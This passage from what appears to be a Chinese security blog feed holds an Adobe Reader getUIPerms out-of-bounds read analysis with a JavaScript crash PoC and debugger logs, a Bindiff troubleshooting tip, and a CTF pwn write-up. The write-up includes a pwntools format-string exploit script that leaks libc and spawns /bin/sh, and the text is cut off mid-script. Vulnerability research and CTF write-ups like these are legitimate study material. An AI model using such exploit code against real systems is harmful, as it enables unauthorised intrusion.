4:4 g is not a variable</span><br><span class="line">line 13:4 no such <span class="keyword">function</span>: z</span><br><span class="line">line 14:4 y is not a <span class="keyword">function</span></span><br><span class="line">line 15:8 f is not a variable</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="0x04：-引用"><a href="#0x04：-引用" class="headerlink" title="0x04： 引用"></a>0x04： 引用</h4><p>《antlr4权威指南》</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>编译原理</tag>
        <tag>Antlr</tag>
      </tags>
  </entry>
  <entry>
    <title>Adobe Acrobat Reader getUIPerms/setUIPerms  Unicode String Out-of-bound Read</title>
    <url>/2019/08/14/Adobe-Acrobat-Reader-getUIPerms-setUIPerms-Unicode-String-Out-of-bound-Read/</url>
    <content><![CDATA[<h1 id="Unicode-String-Out-of-bound-Read"><a href="#Unicode-String-Out-of-bound-Read" class="headerlink" title="Unicode String Out-of-bound Read"></a>Unicode String Out-of-bound Read</h1><p>8月补丁被xlab撞了，索性就放出来了。</p>
<p>[TOC]</p>
<a id="more"></a>

<h2 id="0x00-PoC"><a href="#0x00-PoC" class="headerlink" title="0x00 : PoC"></a>0x00 : PoC</h2><p><code>doc</code>对象的<code>getUIPerms</code>函数的越界读</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.doc.getUIPerms(&#123;<span class="attr">cFeatureName</span>:<span class="string">"\xFE\xFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>其实setUIPerms也能触发，但是参数和这个getUIPerms不太一样，但是核心问题都是一样的。</p>
<h2 id="0x01-Crash-log"><a href="#0x01-Crash-log" class="headerlink" title="0x01 : Crash log"></a>0x01 : Crash log</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(2a70.388): Access violation - code c0000005 (!!! second chance !!!)</span><br><span class="line">eax&#x3D;32d7cf00 ebx&#x3D;0098cbd0 ecx&#x3D;00000000 edx&#x3D;32d7d000 esi&#x3D;00000068 edi&#x3D;7fffffff</span><br><span class="line">eip&#x3D;59ca7675 esp&#x3D;0098ca98 ebp&#x3D;0098caa4 iopl&#x3D;0         nv up ei ng nz ac pe cy</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00010297</span><br><span class="line">EScript!mozilla::HashBytes+0x47e7f:</span><br><span class="line">59ca7675 8a02            mov     al,byte ptr [edx]          ds:002b:32d7d000&#x3D;??</span><br><span class="line">0:000&gt; k10</span><br><span class="line"> # ChildEBP RetAddr  </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00 0098caa4 59c52b96 EScript!mozilla::HashBytes+0x47e7f</span><br><span class="line">01 0098cab8 59c545c4 EScript!PlugInMain+0x1119</span><br><span class="line">02 0098cad8 59c54331 EScript!PlugInMain+0x2b47</span><br><span class="line">03 0098cb0c 59ca76d5 EScript!PlugInMain+0x28b4</span><br><span class="line">04 0098cb24 59ca29f4 EScript!mozilla::HashBytes+0x47edf</span><br><span class="line">05 0098cb9c 59c93bb3 EScript!mozilla::HashBytes+0x431fe</span><br><span class="line">06 0098cbec 59c93912 EScript!mozilla::HashBytes+0x343bd</span><br><span class="line">07 0098cc64 59ca1f86 EScript!mozilla::HashBytes+0x3411c</span><br><span class="line">08 0098cce0 59c86d06 EScript!mozilla::HashBytes+0x42790</span><br><span class="line">09 0098cd54 59c8175d EScript!mozilla::HashBytes+0x27510</span><br><span class="line">0a 0098d210 59c80606 EScript!mozilla::HashBytes+0x21f67</span><br><span class="line">0b 0098d250 59c80517 EScript!mozilla::HashBytes+0x20e10</span><br><span class="line">0c 0098d28c 59c80460 EScript!mozilla::HashBytes+0x20d21</span><br><span class="line">0d 0098d2bc 59c68ec3 EScript!mozilla::HashBytes+0x20c6a</span><br><span class="line">0e 0098d304 59ca87ac EScript!mozilla::HashBytes+0x96cd</span><br><span class="line">0f 0098d380 59ca84ec EScript!mozilla::HashBytes+0x48fb6</span><br><span class="line">0:000&gt; dd edx-10</span><br><span class="line">32d7cff0  41414141 41414141 41414141 d0004141</span><br><span class="line">32d7d000  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d010  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d020  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d030  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d040  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d050  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d060  ???????? ???????? ???????? ????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dd edx-0x80</span><br><span class="line">32d7cf80  00000067 00001000 00000000 00000000</span><br><span class="line">32d7cf90  0475f34c dcbabbbb 4141fffe 41414141</span><br><span class="line">32d7cfa0  41414141 41414141 41414141 41414141</span><br><span class="line">32d7cfb0  41414141 41414141 41414141 41414141</span><br><span class="line">32d7cfc0  41414141 41414141 41414141 41414141</span><br><span class="line">32d7cfd0  41414141 41414141 41414141 41414141</span><br><span class="line">32d7cfe0  41414141 41414141 41414141 41414141</span><br><span class="line">32d7cff0  41414141 41414141 41414141 d0004141</span><br></pre></td></tr></table></figure>

<p>参数是 <code>\xFE\xFF\x41414141.....</code></p>
<p><code>edx</code>指向参数</p>
<h2 id="0x02-Analysis"><a href="#0x02-Analysis" class="headerlink" title="0x02 : Analysis"></a>0x02 : Analysis</h2><p>读<code>unicode</code>字符串函数，是没有问题的，应该是上层逻辑的问题，没有做充分的判断，导致用读<code>unicode string</code>的逻辑去读取了<code>ascii string</code> 。</p>
<p>这就导致，读取了更多的数据，然后就<code>oob</code>了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_23802B75</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">void</span> (__cdecl *a3)(<span class="keyword">const</span> <span class="keyword">wchar_t</span> *, <span class="keyword">const</span> <span class="keyword">wchar_t</span> *, <span class="keyword">const</span> <span class="keyword">wchar_t</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">uintptr_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &amp;&amp; *a1 == <span class="number">0xFE</span>u &amp;&amp; a1[<span class="number">1</span>] == <span class="number">0xFF</span>u )</span><br><span class="line">    result = sub_2385763B(a1, a2, a3);          <span class="comment">// unicode</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = sub_23802BA9(a1, a2, a3);          <span class="comment">// ascii string</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试，漏洞发生时参数信息如下：</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/adobe%20reader%20oobr/15513280448165.jpg"></p>
<p>可以看到，传入的参数并不是<code>unicode string</code>，但是却按照<code>unicode string</code>的代码逻辑去读，所以就越界了。</p>
<p>上一层逻辑中，我们看到，对于读取字符串的逻辑来说，只简单的检查了：</p>
<ol>
<li>字符串是否有效</li>
<li>字符串开头是否是\xFE\xFF</li>
<li>满足2，就走unicode逻辑</li>
<li>不满足就走ascii逻辑</li>
</ol>
<p>但是这里应该不是<code>root cause</code>，而且这部分底层逻辑也没啥问题，应该是上层的逻辑出了问题，导致下层代码执行时候崩溃。</p>
<p>问题出在 <code>app.doc.getUIPerms()</code> 函数实现，在参数传递的时候，参数处理考虑不周导致。</p>
<p>需要找这个对象注册方法的地方，找了一圈，发现这个方法的实现在<code>DigSig.api</code>中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; da poi(esp+8)</span><br><span class="line">553dfbbc  &quot;getUIPerms&quot;</span><br><span class="line">0:000&gt; ln poi(esp+c)</span><br><span class="line">(55311705)   DigSig!PlugInMain+0x48f3a   |  (55311705)   DigSig!PlugInMain</span><br></pre></td></tr></table></figure>

<p>但是调试发现，根本没有触发到这里的代码逻辑。</p>
<p>追踪堆内存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    address 46df9f98 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 5c91000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                471b1820:         46df9f98               67 -         46df9000             2000</span><br><span class="line">    5a52abb0 verifier!VerifierDisableFaultInjectionExclusionRange+0x000034c0</span><br><span class="line">    7707246b ntdll!RtlDebugAllocateHeap+0x00000039</span><br><span class="line">    76fd6dd9 ntdll!RtlpAllocateHeap+0x000000f9</span><br><span class="line">    76fd5ec9 ntdll!RtlpAllocateHeapInternal+0x00000179</span><br><span class="line">    76fd5d3e ntdll!RtlAllocateHeap+0x0000003e</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\System32\ucrtbase.dll - </span><br><span class="line">    74840106 ucrtbase!malloc_base+0x00000026</span><br><span class="line">    5782a2bc AcroRd32!AXWasInitViaPDFL+0x000008cf</span><br><span class="line">    5782e829 AcroRd32!CTJPEGLibInit+0x00002039</span><br><span class="line">    542245d8 EScript!PlugInMain+0x00002b5b &#x2F;&#x2F;this will call alloc func</span><br><span class="line">    54224331 EScript!PlugInMain+0x000028b4</span><br><span class="line">    542776d5 EScript!mozilla::HashBytes+0x00047edf</span><br><span class="line">    542729f4 EScript!mozilla::HashBytes+0x000431fe</span><br><span class="line">    54263bb3 EScript!mozilla::HashBytes+0x000343bd</span><br><span class="line">    54263912 EScript!mozilla::HashBytes+0x0003411c</span><br><span class="line">    54271f86 EScript!mozilla::HashBytes+0x00042790</span><br><span class="line">    54256d06 EScript!mozilla::HashBytes+0x00027510</span><br><span class="line">    5425175d EScript!mozilla::HashBytes+0x00021f67</span><br><span class="line">    54250606 EScript!mozilla::HashBytes+0x00020e10</span><br><span class="line">    54250517 EScript!mozilla::HashBytes+0x00020d21</span><br><span class="line">    54250460 EScript!mozilla::HashBytes+0x00020c6a</span><br><span class="line">    54238ec3 EScript!mozilla::HashBytes+0x000096cd</span><br><span class="line">    542787ac EScript!mozilla::HashBytes+0x00048fb6</span><br><span class="line">    542784ec EScript!mozilla::HashBytes+0x00048cf6</span><br><span class="line">    542780e5 EScript!mozilla::HashBytes+0x000488ef</span><br><span class="line">    542770b4 EScript!mozilla::HashBytes+0x000478be</span><br><span class="line">    542e85e9 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x00061731</span><br><span class="line">    5803da6f AcroRd32!AIDE::PixelPartInfo::operator&#x3D;+0x0010536f</span><br><span class="line">    57f6723a AcroRd32!AIDE::PixelPartInfo::operator&#x3D;+0x0002eb3a</span><br><span class="line">    57f6345e AcroRd32!AIDE::PixelPartInfo::operator&#x3D;+0x0002ad5e</span><br><span class="line">    57d3002d AcroRd32!AX_PDXlateToHostEx+0x001ff9b5</span><br><span class="line">    57d3057c AcroRd32!AX_PDXlateToHostEx+0x001fff04</span><br><span class="line">    57f66e8e AcroRd32!AIDE::PixelPartInfo::operator&#x3D;+0x0002e78e</span><br></pre></td></tr></table></figure>



<p>callstack 和 堆追踪 得到的结果 前部分重合，内存在</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/adobe%20reader%20oobr/15513387673921.jpg" alt="-w699"></p>
<p>这个call里分配，这个call一直到核心dll再到ntdll去分配内存。</p>
<p>分析的参数来源发现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">else if ( a3 &#x3D;&#x3D; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 &#x3D; (*(int (__cdecl **)(_DWORD, void *))(dword_23A65354 + 0x60))(*v4, Src);&#x2F;&#x2F; </span><br><span class="line">                                              &#x2F;&#x2F; </span><br><span class="line">                                              &#x2F;&#x2F; 0:000&gt; dd 4bc86fe8 </span><br><span class="line">                                              &#x2F;&#x2F; 4bc86fe8  000000cc 4f6d0f30 00000000 00000000</span><br><span class="line">                                              &#x2F;&#x2F; 4bc86ff8  00000000 00000000 ???????? ????????</span><br><span class="line">                                              &#x2F;&#x2F; 4bc87008  ???????? ???????? ???????? ????????</span><br><span class="line">                                              &#x2F;&#x2F; 4bc87018  ???????? ???????? ???????? ????????</span><br><span class="line">                                              &#x2F;&#x2F; 4bc87028  ???????? ???????? ???????? ????????</span><br><span class="line">                                              &#x2F;&#x2F; 4bc87038  ???????? ???????? ???????? ????????</span><br><span class="line">                                              &#x2F;&#x2F; 4bc87048  ???????? ???????? ???????? ????????</span><br><span class="line">                                              &#x2F;&#x2F; 4bc87058  ???????? ???????? ???????? ????????</span><br><span class="line">                                              &#x2F;&#x2F; </span><br><span class="line">                                              &#x2F;&#x2F; length str</span><br><span class="line">                                              &#x2F;&#x2F; </span><br><span class="line">                                              &#x2F;&#x2F; unicode str--&gt; ascii str</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这个调用对数据作处理，输入数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; dd 4f6d0f30 </span><br><span class="line">4f6d0f30  00ff00fe 00410041 00410041 00410041</span><br><span class="line">4f6d0f40  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0f50  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0f60  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0f70  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0f80  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0f90  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0fa0  00410041 00410041 00410041 00410041</span><br><span class="line">0:000&gt; dd 4f6d0f30  + 0xcc</span><br><span class="line">4f6d0ffc  d0d00000 ???????? ???????? ????????</span><br><span class="line">4f6d100c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d101c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d102c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d103c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d104c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d105c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d106c  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>

<p>得到的结果是:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; r eax</span><br><span class="line">eax&#x3D;4b9cef98</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">4b9cef98  4141fffe 41414141 41414141 41414141</span><br><span class="line">4b9cefa8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefb8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefc8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefd8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefe8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9ceff8  41414141 d0004141 ???????? ????????</span><br><span class="line">4b9cf008  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>

<p>然后直接把这个<code>buffer</code>为参数传递给处理函数（此时这是一个ascii string)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; p</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">eax&#x3D;4b9cef98 ebx&#x3D;0098cec4 ecx&#x3D;00000000 edx&#x3D;7fffff99 esi&#x3D;4b9cef98 edi&#x3D;0098ce4c</span><br><span class="line">eip&#x3D;529145bf esp&#x3D;0098ce10 ebp&#x3D;0098ce28 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00000202</span><br><span class="line">EScript!PlugInMain+0x2b42:</span><br><span class="line">529145bf e8b1e5ffff      call    EScript!PlugInMain+0x10f8 (52912b75)</span><br><span class="line">0:000&gt; dd esi</span><br><span class="line">4b9cef98  4141fffe 41414141 41414141 41414141</span><br><span class="line">4b9cefa8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefb8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefc8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefd8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefe8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9ceff8  41414141 d0004141 ???????? ????????</span><br><span class="line">4b9cf008  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>

<p>处理函数判断是不是<code>unicode</code>，只是判断前两个字符是不是<code>\xFE\xFF</code>，就走了<code>unicode</code>逻辑，所以导致越界读。</p>
<h2 id="0x03-what-is-root-cause"><a href="#0x03-what-is-root-cause" class="headerlink" title="0x03 : what is root cause"></a>0x03 : what is root cause</h2><p>其实就是上层一点的逻辑对输入的参数没做转换(to unicode)，导致后面获取长度的函数处理字符串的时候，误认为<code>\xFE\xFF</code>开头的就是unicode字符串，然后就越界读取了。</p>
<h2 id="0x04-🤔"><a href="#0x04-🤔" class="headerlink" title="0x04 : 🤔"></a>0x04 : 🤔</h2><p>几个月前写的分析了，可能会有错误，有问题欢迎和我沟通  : -)</p>
<p>这个攻击面可能就这么一点一点的消失了吧 :-)</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Adobe Reader</tag>
        <tag>1day</tag>
      </tags>
  </entry>
  <entry>
    <title>Bindiff5.0 Could not create file handler fix</title>
    <url>/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/</url>
    <content><![CDATA[<h2 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 : 问题"></a>0x00 : 问题</h2><p>升级Mojave后(这事儿Mojave不背锅)， bindiff5.0 工作一直有问题：</p>
<p><code>Failed to initalize file logger. Could not create file handler</code></p>
<a id="more"></a>

<p>今天总算搞定了这个问题，记录一下过程。</p>
<h2 id="0x01-尝试过程"><a href="#0x01-尝试过程" class="headerlink" title="0x01 : 尝试过程"></a>0x01 : 尝试过程</h2><ol>
<li>重装ida 和 bindiff。 ❌</li>
<li>Java环境问题？ ❌</li>
</ol>
<p>后来发现是日志文件的问题，正常情况下，你的日志是在:</p>
<p><code>/Users/YOUR_USER_NAME/Library/Application Support/.bindiff</code></p>
<p>有意思的情况是，如果你之前装过其他版本的bindiff，<strong>卸载后这个目录并不会被删除</strong>，这就导致了后面高版本bindiff出现一开始的问题。笔者就是之前用ida6.8，配合bindiff4.3，所以出现了这个问题。</p>
<h2 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 : 解决方案"></a>0x02 : 解决方案</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo rm -rf /Users/YOUR_USER_NAME/Library/Application Support/.bindiff</span><br></pre></td></tr></table></figure>

<p>重新安装bindiff5.0</p>
<p>问题解决！happy diff， happy bug hunting！</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IDA</tag>
        <tag>Bindiff</tag>
      </tags>
  </entry>
  <entry>
    <title>Baiudu杯 pwn专场记录</title>
    <url>/2016/11/07/Baiudu%E6%9D%AF-pwn%E4%B8%93%E5%9C%BA%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>十一月的第一周，百度杯的pwn专场，就去学习了下姿势，更加认识到自己的不足和问题所在，以后努力更正改进~<br>本次比赛一共是3个misc和三个pwn，题目都不难，pwn好像有两个都是原题，但是我只google到了第二个题目…</p>
<a id="more"></a>

<h4 id="1-pwnme"><a href="#1-pwnme" class="headerlink" title="1.pwnme"></a>1.pwnme</h4><pre><code>格式化字符串(x64)</code></pre>
<p>其实后面还有个bof，fmt和bof的结合可能才是出题人的本意吧(我猜的)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec pwnme </span><br><span class="line">[!] Couldn&#39;t find relocations against PLT to get symbols</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;muhe&#x2F;Desktop&#x2F;baidu-pwn1&#x2F;pwnme&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure>
<ul>
<li>   格式化字符串<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/baidu-pwn/vuln.png"><br>在输出<code>name</code>和<code>pass</code>的时候会导致这个格式化字符串，可以任意地址读写。</li>
</ul>
<p>但是需要注意</p>
<ul>
<li>   x64中fmt 泄露的参数的顺序(<code> RDI-RDX-RCX-R8-R9-stack[0]-stack[1]......</code>)</li>
<li>   因为有00截断，所以要格式化的地址放后面( -。- 没错 后入式)</li>
</ul>
<p>本来以为开了 Full RELRO 的情况下 DynELF就不行了，还想着手动去解析出libc基地址然后再搞呢…改了下方式就可以了。<br>在师傅的指导下完成了leak的部分，然后是使用DynELF去泄露system的地址，后面改返回地址为system，然后设置好参数后，ret过去。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># based on joker 's exploit</span></span><br><span class="line">r = remote(<span class="string">"106.75.84.74"</span>, <span class="number">10001</span>)<span class="comment">#pwn</span></span><br><span class="line"><span class="comment">#r = remote("127.0.0.1", 10001)#pwn</span></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">read_got = <span class="number">0x0000000000601FC8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ed3</span></span><br><span class="line">pppr = <span class="number">0x000000000400ECE</span></span><br><span class="line"><span class="comment">#ret addr 0x0000000000400e56</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">    payload = <span class="string">"aaaa"</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">    payload = <span class="string">"%12$s"</span>+<span class="string">"AAAAAAA"</span> + p64(addr)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    content = r.recvuntil(<span class="string">"AAAAAAA"</span>)</span><br><span class="line">    <span class="keyword">if</span>(len(content) == <span class="number">12</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] NULL "</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*]%#x -- &gt; %s"</span> % (addr,(content[<span class="number">5</span>:<span class="number">-7</span>] <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">        <span class="keyword">return</span> content[<span class="number">5</span>:<span class="number">-7</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#writebyte</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writebyte</span><span class="params">(count_byte,addr)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">    payload = <span class="string">"aaaa"</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">    payload = <span class="string">"%&#123;0&#125;c%12$hhn"</span>.format(count_byte)</span><br><span class="line">    payload += <span class="string">"A"</span>*(<span class="number">12</span>-len(payload)) + p64(addr)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"40):"</span>)</span><br><span class="line">r.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"40):"</span>)</span><br><span class="line">r.sendline(<span class="string">"aaa"</span>)</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">'./pwnme'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] system addr:&#123;0&#125;"</span>.format(hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak ret_addr</span></span><br><span class="line">r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">payload = <span class="string">"aaaa"</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">payload = <span class="string">"%6$s"</span> <span class="comment">#stack</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">content = r.recv(<span class="number">6</span>)</span><br><span class="line">content = content.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">stack_addr = u64(content)  <span class="comment"># 0x7ffc23fb85e0</span></span><br><span class="line">stack_while_ret_addr = stack_addr + <span class="number">8</span> - <span class="number">0xb0</span> <span class="comment">#</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] stack_while_ret addr:&#123;0&#125;"</span>.format(hex(stack_while_ret_addr))</span><br><span class="line"><span class="comment">#leak_ret_addr</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0000| 0x7ffc23fb84f0 --&gt; 0x7ffc23fb8530 --&gt; 0x7ffc23fb85e0 --&gt; 0x400e70 (push   r15)</span></span><br><span class="line"><span class="string">0008| 0x7ffc23fb84f8 --&gt; 0x400d32 (add    rsp,0x30)</span></span><br><span class="line"><span class="string">0016| 0x7ffc23fb8500 --&gt; 0xa61616161 ('aaaa\n')</span></span><br><span class="line"><span class="string">0024| 0x7ffc23fb8508 --&gt; 0x0 </span></span><br><span class="line"><span class="string">0032| 0x7ffc23fb8510 --&gt; 0x7324362500000000 ('')</span></span><br><span class="line"><span class="string">0040| 0x7ffc23fb8518 --&gt; 0x0 </span></span><br><span class="line"><span class="string">0048| 0x7ffc23fb8520 --&gt; 0x0 </span></span><br><span class="line"><span class="string">0056| 0x7ffc23fb8528 --&gt; 0x400d0b (cmp    eax,0x2)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">writebyte(<span class="number">0xce</span>,stack_while_ret_addr)</span><br><span class="line">writebyte(system_addr &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span>)</span><br><span class="line">writebyte((system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">1</span>)</span><br><span class="line">writebyte((system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">2</span>)</span><br><span class="line">writebyte((system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">3</span>)</span><br><span class="line">writebyte((system_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">4</span>)</span><br><span class="line">writebyte((system_addr &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">payload = <span class="string">"/bin/sh;"</span> + <span class="string">"AAAAAAAABBB"</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">payload = <span class="string">"\x00\x00\x00\x00"</span> + p64(pop_rdi_ret) + p64(stack_while_ret_addr + <span class="number">8</span>)</span><br><span class="line"><span class="comment">#raw_input('$ret')</span></span><br><span class="line">r.send(payload)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span 